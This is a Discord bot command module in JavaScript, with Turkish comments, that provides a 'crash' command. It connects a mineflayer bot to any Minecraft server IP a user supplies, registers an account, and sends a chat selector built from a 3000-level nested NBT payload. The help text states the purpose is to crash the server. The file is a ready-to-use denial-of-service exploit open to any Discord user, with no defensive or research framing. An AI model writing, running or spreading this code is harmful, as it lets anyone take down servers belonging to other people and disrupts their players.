const Discord = require('discord.js');
const mineflayer = require('mineflayer');
const sqlite3 = require('sqlite3').verbose();
const { randomBytes } = require('crypto');
const ayarlar = require('../ayarlar.json');

// Veritabanı bağlantısı oluşturma
let db = new sqlite3.Database('./ccdata.db', (err) => {
    if (err) {
        console.error('Database bağlantısı başarısız oldu:', err);
    } else {
        console.log('Veritabanına başarıyla bağlanıldı.');
        db.run(`CREATE TABLE IF NOT EXISTS bots (name TEXT PRIMARY KEY, password TEXT)`);
    }
});

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

exports.run = async (client, message, args) => {
    var prefix = ayarlar.prefix;

    if (args[0] === 'crash') {
        const ip = args[1];
        const port = args[2] || 25565; // Port verilmediyse 25565 kullanılır

        if (!ip) {
            return message.channel.send('Lütfen geçerli bir IP adresi girin.');
        }

        let botName = generateRandomString(12);
        let botPassword = generateRandomString(12);

        db.get(`SELECT password FROM bots WHERE name = ?`, [botName], (err, row) => {
            if (err) {
                console.error('Veritabanı sorgusu başarısız oldu:', err);
                return;
            }

            if (row) {
                // Bot ismi zaten veritabanında mevcut, bu yüzden aynı şifreyi kullanıyoruz
                botPassword = row.password;
            } else {
                // Yeni bot ismi ve şifresi veritabanına kaydediliyor
                db.run(`INSERT INTO bots (name, password) VALUES (?, ?)`, [botName, botPassword], (err) => {
                    if (err) {
                        console.error('Veritabanına kayıt eklenemedi:', err);
                    } else {
                        console.log(`Yeni bot ismi ve şifresi kaydedildi: ${botName}, ${botPassword}`);
                    }
                });
            }

            const bot = mineflayer.createBot({
                host: ip,
                port: parseInt(port),
                username: botName
            });

            bot.on('login', () => {
                bot.chat(`/register ${botPassword} ${botPassword}`);
                bot.chat(`/login ${botPassword} ${botPassword}`);

                const overflow = JSON.stringify(generateJsonObject(3000)).replace(/"/g, '');
                bot.chat(`/msg @a[nbt=${overflow}]`);

                message.channel.send(`Exploit attempt sent to ${ip}:${port}. Bot Name: ${botName}`);
            });
        });
    }

    function generateJsonObject(levels) {
        const jsonObject = {};
        if (levels > 0) {
            jsonObject['a'] = generateJsonObject(levels - 1);
        }
        return jsonObject;
    }
};

exports.conf = {
    aliases: ['crash'],
    permLevel: 0,
    kategori: 'Genel'
};

exports.help = {
    name: 'crash',
    description: 'Minecraft sunucusunu çökertmek için kullanılır.',
    usage: 'crash <ip> [port]'
};
